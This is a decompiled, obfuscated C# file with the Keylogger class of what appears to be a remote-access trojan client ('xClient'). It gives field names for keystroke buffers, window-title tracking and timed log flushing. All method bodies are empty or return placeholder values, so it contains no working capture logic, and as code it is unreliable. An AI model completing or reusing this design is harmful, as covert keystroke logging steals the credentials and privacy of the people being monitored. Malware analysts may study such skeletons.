using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;
using xClient.Core.MouseKeyHook;

namespace xClient.Core.Utilities;

public class Keylogger : IDisposable
{
	public static Keylogger Instance;

	private readonly Timer _timerFlush;

	private StringBuilder _logFileBuffer;

	private List<Keys> _pressedKeys;

	private List<char> _pressedKeyChars;

	private string _lastWindowTitle;

	private bool _ignoreSpecialKeys;

	private IKeyboardMouseEvents _mEvents;

	internal static Keylogger NPN4CLLlCnQFAlK5UfG;

	public bool IsDisposed
	{
		[CompilerGenerated]
		get
		{
			return true;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public static string LogDirectory => null;

	public Keylogger(double flushInterval)
	{
	}

	public void Dispose()
	{
	}

	protected virtual void Dispose(bool disposing)
	{
	}

	private void Subscribe(IKeyboardMouseEvents events)
	{
	}

	private void Unsubscribe()
	{
	}

	private void OnKeyDown(object sender, KeyEventArgs e)
	{
	}

	private void OnKeyPress(object sender, KeyPressEventArgs e)
	{
	}

	private void OnKeyUp(object sender, KeyEventArgs e)
	{
	}

	private string HighlightSpecialKeys(Keys[] keys)
	{
		return null;
	}

	private void timerFlush_Elapsed(object sender, ElapsedEventArgs e)
	{
	}

	private void WriteFile()
	{
	}

	static Keylogger()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		HUqOGbLNt989UHkf9Xe();
	}

	internal static bool wbpyqeLqCyF6yV05FnO()
	{
		return true;
	}

	internal static Keylogger RLG7yUL5vgSWYTMet7S()
	{
		return null;
	}

	internal static object kiqZrjLAFx8xKnsTb2H(Environment.SpecialFolder specialFolder_0)
	{
		return null;
	}

	internal static object IpQWb4LMAfxaNd19BFa(object object_0, object object_1)
	{
		return null;
	}

	internal static void EG7cy2LXMaeqJKqfVd6()
	{
	}

	internal static object IE1qlwLiCNSM3MHp8wN()
	{
		return null;
	}

	internal static void f5jFoXLkvJkDxX5NHWt(object object_0, double double_0)
	{
	}

	internal static void qCGT14LS2Lj3CaYPXYX(object object_0)
	{
	}

	internal static void y9gMBALLSN2o9HddKCw(object object_0, bool disposing)
	{
	}

	internal static void KDsEBXLebDt8jjlIRij(object object_0)
	{
	}

	internal static void EvGn7gLOUpsmYcRgUft(object object_0)
	{
	}

	internal static void ShC2rjLWKQurK8W6XD9(object object_0, object object_1)
	{
	}

	internal static void gZpxP2LV1lAm7Qsflnl(object object_0, object object_1)
	{
	}

	internal static void t1drgPL2sAT1UsP9SMI(object object_0, object object_1)
	{
	}

	internal static void RSNCd1Lxm5sV8gtdIrd(object object_0, object object_1)
	{
	}

	internal static void f4u1VbLahhOlKIFhtRD(object object_0, object object_1)
	{
	}

	internal static object qEBInxL4V52l7Pc6ctj()
	{
		return null;
	}

	internal static bool ui4QLFLbJGGeJpqdO6T(object object_0)
	{
		return true;
	}

	internal static bool a9LgfRLE7ESg9bMgBsN(object object_0, object object_1)
	{
		return true;
	}

	internal static object tQPfdtLBED30aHrUWr7(int int_0)
	{
		return null;
	}

	internal static object d6xhJpLTUGmZ0TIGl3S(object object_0)
	{
		return null;
	}

	internal static DateTime q4Vb8BLZ5g9tL6v8yZ1()
	{
		return (DateTime)(object)null;
	}

	internal static object G3a4i9Lgc8Agggor7gn(object object_0)
	{
		return null;
	}

	internal static Keys mPtNBWLFdbHFdgFVARg(object object_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return (Keys)(object)null;
	}

	internal static bool l3m36wLUCjrPFqgK0YM(Keys k)
	{
		return true;
	}

	internal static char rE3dyZLmaTyuWaNVJVg(object object_0)
	{
		return '\0';
	}

	internal static object POvHYYL37e87oFFrUOd(object object_0, object object_1)
	{
		return null;
	}

	internal static void lpfn8pLcTECoKsvjMdl(object object_0)
	{
	}

	internal static object eD7UuPLsi38IA5lx76U(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static bool zl8STBLJDGq6eAv7hch(object object_0, object object_1)
	{
		return true;
	}

	internal static object GdwWkbLGWciMesdyZGb(object object_0, object object_1, object object_2)
	{
		return null;
	}

	internal static int ayPW3BL7hvpXlgblLHw(object object_0)
	{
		return 0;
	}

	internal static bool CObOCuLYWxvNsKcK1ac()
	{
		return true;
	}

	internal static object Cp0jSHLwHPnnPq7utpb()
	{
		return null;
	}

	internal static bool rVh1OoL8qEifnE49Zsq(object object_0)
	{
		return true;
	}

	internal static void Wyu8tJL6AU9ZVEhmS3Q(object object_0)
	{
	}

	internal static bool NVorh8LnC4CHDvgIbxp(object object_0)
	{
		return true;
	}

	internal static void oYlc6DLDpQo0hQ7lO0Y(object object_0, object object_1)
	{
	}

	internal static object Rq9hiHLjoxb5S5Cjva5(object object_0)
	{
		return null;
	}

	internal static void HUqOGbLNt989UHkf9Xe()
	{
	}
}
